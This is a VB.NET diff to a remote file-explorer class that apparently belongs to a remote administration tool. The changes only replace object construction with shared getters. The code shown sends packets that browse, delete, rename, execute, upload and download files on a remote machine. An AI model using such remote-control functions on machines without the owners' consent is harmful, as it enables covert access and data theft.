@@ -83,7 +83,7 @@ Public Class clsFileExplorer
         Private Function SendUploadBegin() As Boolean
             If fileObj Is Nothing Then Return False
             Dim packet() As Byte = Nothing
-            Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+            Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
             BinWriter.BufferAddDword(packet, 2)
             BinWriter.BufferAddDword(packet, Attr.Session)
             BinWriter.BufferAddDword(packet, (Len(Attr.uploadedPath) + 1) * 2)
@@ -104,7 +104,7 @@ Public Class clsFileExplorer
 
             'Now send upload chunk data
             Dim packet() As Byte = Nothing
-            Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+            Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
             BinWriter.BufferAddDword(packet, 3)
             BinWriter.BufferAddDword(packet, Attr.Session)
             BinWriter.BufferAddDword(packet, Attr.totalSize)
@@ -116,7 +116,7 @@ Public Class clsFileExplorer
 
         Private Sub SendUploadEnd()
             Dim packet() As Byte = Nothing
-            Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+            Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
 
             BinWriter.BufferAddDword(packet, 4)
             BinWriter.BufferAddDword(packet, Attr.Session)
@@ -139,7 +139,7 @@ Public Class clsFileExplorer
         Private fileObj As FileStream
 
         Public Sub OnDownloadPacketStart(ByVal packet() As Byte)
-            Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+            Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
             Dim chunkSize As Integer = BinReader.BufferReadDWORD(packet, 16)
 
             Attr.totalSize = BinReader.BufferReadDWORD(packet, 8)
@@ -152,7 +152,7 @@ Public Class clsFileExplorer
         End Sub
 
         Public Sub OnDownloadPacketProgress(ByVal packet() As Byte)
-            Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+            Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
             Dim chunkSize As UInteger = BinReader.BufferReadDWORD(packet, 16)
 
             Attr.totalSize = BinReader.BufferReadDWORD(packet, 8)
@@ -167,7 +167,7 @@ Public Class clsFileExplorer
         End Sub
 
         Public Sub OnDownloadPacketEnd(ByVal packet() As Byte)
-            Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+            Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
             Dim chunkSize As Integer = BinReader.BufferReadDWORD(packet, 16)
 
             Attr.totalSize = BinReader.BufferReadDWORD(packet, 8)
@@ -192,7 +192,7 @@ Public Class clsFileExplorer
     End Sub
 
     Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
-        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
         Dim ID As Byte = BinReader.BufferReadDWORD(packet, 0)
 
         Select Case ID
@@ -252,14 +252,14 @@ Public Class clsFileExplorer
 
     Public Sub SendGetDiskMask()
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         BinWriter.BufferAddDword(packet, 0)
         SendPacket(packet)
     End Sub
 
     Public Sub SendBrowseFolder(ByVal path As String)
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         BinWriter.BufferAddDword(packet, 1)
         BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
         BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
@@ -269,7 +269,7 @@ Public Class clsFileExplorer
 
     Public Sub SendDeleteFile(ByVal path As String)
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         BinWriter.BufferAddDword(packet, 8)
         BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
         BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
@@ -279,7 +279,7 @@ Public Class clsFileExplorer
 
     Public Sub SendRenameFile(ByVal oldPath As String, ByVal newPath As String)
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         BinWriter.BufferAddDword(packet, 9)
         BinWriter.BufferAddDword(packet, (Len(oldPath) + 1) * 2)
         BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(oldPath))
@@ -292,7 +292,7 @@ Public Class clsFileExplorer
 
     Public Sub SendExecuteFile(ByVal path As String)
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         BinWriter.BufferAddDword(packet, 11)
         BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
         BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
@@ -302,7 +302,7 @@ Public Class clsFileExplorer
 
     Public Sub SendCreateDirectory(ByVal path As String)
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         BinWriter.BufferAddDword(packet, 10)
         BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
         BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
@@ -312,7 +312,7 @@ Public Class clsFileExplorer
 
     Public Sub SendDownload(ByVal path As String)
         Dim packet() As Byte = Nothing
-        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWriter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim Session As UInteger = RandomDWORD()
 
         BinWriter.BufferAddDword(packet, 5)
@@ -378,7 +378,7 @@ Public Class clsFileExplorer
 
     Private Function BufferTo_LITE_WIN32_FIND_DATA(ByVal Buffer As Byte())
         Dim result As LITE_WIN32_FIND_DATA
-        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader
+        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
 
         result.ftCreationTime = BinReader.BufferReadQWORD(Buffer, 0)
         result.ftLastWriteTime = BinReader.BufferReadQWORD(Buffer, 8)
